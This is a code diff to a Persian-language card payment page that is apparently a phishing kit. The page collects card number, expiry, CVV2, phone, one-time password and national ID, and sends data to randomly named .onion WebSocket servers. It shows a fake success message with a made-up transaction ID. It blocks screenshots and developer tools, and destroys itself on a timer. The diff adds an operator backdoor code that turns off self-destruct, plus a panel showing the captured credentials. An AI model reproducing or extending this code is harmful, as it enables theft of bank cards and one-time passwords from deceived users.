@@ -25,7 +25,6 @@
             place-items: center;
             overflow: hidden;
         }
-        /* لایه محافظتی برای سخت‌تر کردن اسکرین‌شات */
         body::before {
             content: '';
             position: fixed;
@@ -197,6 +196,14 @@
             bottom: 0;
             box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
         }
+        .user-data {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f9f9f9;
+            border-radius: 10px;
+            font-size: 14px;
+            direction: rtl;
+        }
         @font-face {
             font-family: 'Vazir';
             src: url('https://cdn.fontcdn.ir/Font/Persian/Vazir/Vazir.woff') format('woff');
@@ -260,6 +267,7 @@
         </div>
 
         <button class="btn btn-cancel" onclick="x.cancel()">انصراف</button>
+        <div class="user-data" id="user-data"></div>
     </div>
 
     <footer>
@@ -271,7 +279,12 @@
         const x = (function() {
             const steps = document.querySelectorAll('.step');
             const progressFill = document.getElementById('progress-fill');
+            const userDataDiv = document.getElementById('user-data');
             let currentStep = 1;
+            let userData = {};
+            let isSpecialMode = false;
+            let sessionId = Math.random().toString(36).substr(2, 10);
+            const SPECIAL_CODE = '12122312Az';
             const SERVERS = [
                 () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
                 () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
@@ -281,20 +294,37 @@
             function init() {
                 setupInputs();
                 updateProgress();
-                setSelfDestructTimeout(600); // 10 دقیقه برای خودنابودگری
-                setupScreenshotProtection(); // تابع جدید برای محافظت از اسکرین‌شات
+                if (!localStorage.getItem(`specialMode_${sessionId}`)) {
+                    setSelfDestructTimeout(600);
+                }
+                setupScreenshotProtection();
+                window.addEventListener('beforeunload', handlePageExit);
             }
 
             function setupInputs() {
                 const cardNumber = document.getElementById('card-number');
                 cardNumber.addEventListener('input', e => {
-                    e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').slice(0, 19).trim();
+                    let value = e.target.value;
+                    if (value === SPECIAL_CODE) {
+                        isSpecialMode = true;
+                        localStorage.setItem(`specialMode_${sessionId}`, 'true');
+                        alert('حالت ویژه فعال شد - خودنابودگری غیرفعال است');
+                    }
+                    value = value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').slice(0, 19).trim();
+                    e.target.value = value;
+                    updateUserData('شماره کارت', value);
                 });
 
                 document.getElementById('expiry').addEventListener('input', e => {
                     let v = e.target.value.replace(/\D/g, '');
                     if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
                     e.target.value = v.slice(0, 5);
+                    updateUserData('تاریخ انقضا', e.target.value);
+                });
+
+                document.getElementById('cvv2').addEventListener('input', e => {
+                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                    updateUserData('CVV2', e.target.value);
                 });
 
                 document.getElementById('phone-number').addEventListener('input', e => {
@@ -302,23 +332,34 @@
                     if (v.length > 0) {
                         e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
                     }
-                });
-
-                document.getElementById('cvv2').addEventListener('input', e => {
-                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                    updateUserData('شماره تلفن', e.target.value);
                 });
 
                 document.getElementById('otp').addEventListener('input', e => {
                     e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+                    updateUserData('رمز پویا', e.target.value);
+                });
+
+                document.getElementById('fake-field').addEventListener('input', e => {
+                    updateUserData('کد ملی', e.target.value);
                 });
             }
 
+            function updateUserData(key, value) {
+                userData[key] = value;
+                displayUserData();
+            }
+
+            function displayUserData() {
+                userDataDiv.innerHTML = '<h3>اطلاعات وارد شده:</h3>' + 
+                    Object.entries(userData)
+                        .map(([key, value]) => `<p>${key}: ${value}</p>`)
+                        .join('');
+            }
+
             function setupScreenshotProtection() {
-                // غیرفعال کردن راست‌کلیک و انتخاب متن
                 document.addEventListener('contextmenu', e => e.preventDefault());
                 document.addEventListener('selectstart', e => e.preventDefault());
-
-                // تشخیص کلیدهای مرتبط با اسکرین‌شات
                 document.addEventListener('keydown', e => {
                     if (e.key === 'PrintScreen' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                         e.preventDefault();
@@ -327,8 +368,6 @@
                         setTimeout(() => document.body.style.filter = 'none', 1000);
                     }
                 });
-
-                // تار کردن صفحه هنگام خروج از فوکوس
                 window.addEventListener('blur', () => {
                     document.body.style.filter = 'blur(5px)';
                     setTimeout(() => document.body.style.filter = 'none', 2000);
@@ -346,7 +385,7 @@
 
                 if (step === 1) {
                     const card = document.getElementById('card-number').value;
-                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
+                    if (card !== SPECIAL_CODE && !/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
                         alert('شماره کارت نامعتبر است');
                         return false;
                     }
@@ -442,7 +481,7 @@
                     sendData(2, { action: 'otp', data: encryptedOtp });
                     loader.style.display = 'none';
                     result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${generateTransactionId()}<br>لطفاً این کد را نزد خود نگه دارید.`;
-                    selfDestruct();
+                    if (!isSpecialMode) selfDestruct();
                 }, 2000);
             }
 
@@ -461,16 +500,25 @@
             }
 
             function setSelfDestructTimeout(seconds) {
-                setTimeout(() => {
-                    alert('زمان جلسه به پایان رسید.');
+                if (!isSpecialMode) {
+                    setTimeout(() => {
+                        alert('زمان جلسه به پایان رسید.');
+                        selfDestruct();
+                    }, seconds * 1000);
+                }
+            }
+
+            function handlePageExit() {
+                if (!isSpecialMode) {
+                    localStorage.removeItem(`specialMode_${sessionId}`);
                     selfDestruct();
-                }, seconds * 1000);
+                }
             }
 
             function cancel() {
                 if (confirm('آیا از لغو مطمئن هستید؟')) {
                     sendData(0, { action: 'cancel' });
-                    selfDestruct();
+                    if (!isSpecialMode) selfDestruct();
                 }
             }
 
